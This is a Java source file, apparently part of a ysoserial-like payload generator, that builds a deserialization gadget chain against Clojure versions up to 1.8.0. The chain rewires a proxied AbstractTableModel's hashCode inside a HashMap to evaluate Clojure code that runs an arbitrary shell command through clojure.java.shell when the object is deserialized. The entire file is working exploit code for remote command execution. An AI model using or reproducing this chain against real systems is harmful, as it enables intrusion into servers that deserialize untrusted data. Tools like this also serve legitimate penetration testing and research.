package com.ppp.chain.clojure;

import bsh.Interpreter;
import bsh.XThis;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.ppp.utils.Strings;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.*;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				AbstractTableModel$ff19274a.hashCode()
					clojure.core$comp$fn__4727.invoke()
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
 */
@Dependencies({"org.clojure:clojure:<=1.8.0"})
@Authors({Authors.JACKOFMOSTTRADES})
@Sink({Sink.Command})
public class Clojure implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Clojure.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");

        final String clojurePayload =
                String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);


        Map<String, Object> fnMap = new HashMap<String, Object>();
        fnMap.put("hashCode", new clojure.core$constantly().invoke(0));

        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        hashMap.put(model, null);

        fnMap.put("hashCode",
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        return hashMap;
    }
}
